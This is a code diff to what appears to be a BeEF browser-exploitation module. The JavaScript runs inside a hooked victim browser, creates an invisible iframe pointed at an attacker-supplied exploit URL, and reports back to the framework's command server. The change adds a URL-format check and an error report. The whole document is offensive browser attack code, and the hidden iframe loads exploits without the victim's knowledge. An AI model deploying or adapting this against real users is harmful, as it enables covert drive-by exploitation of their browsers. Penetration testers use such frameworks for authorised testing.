@@ -5,7 +5,12 @@
 //
 
 beef.execute(function() {
+	url = '<%= @sploit_url %>';
+	if (!/https?:\/\//i.test(url)) {
+		beef.net.send("<%= @command_url %>", <%= @command_id %>, "error=invalid url");
+		return;
+	}
 	var sploit = beef.dom.createInvisibleIframe();
-        sploit.src = '<%= @sploit_url %>';
-    beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=IFrame Created!");
+        sploit.src = url;
+	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=IFrame Created!");
 });
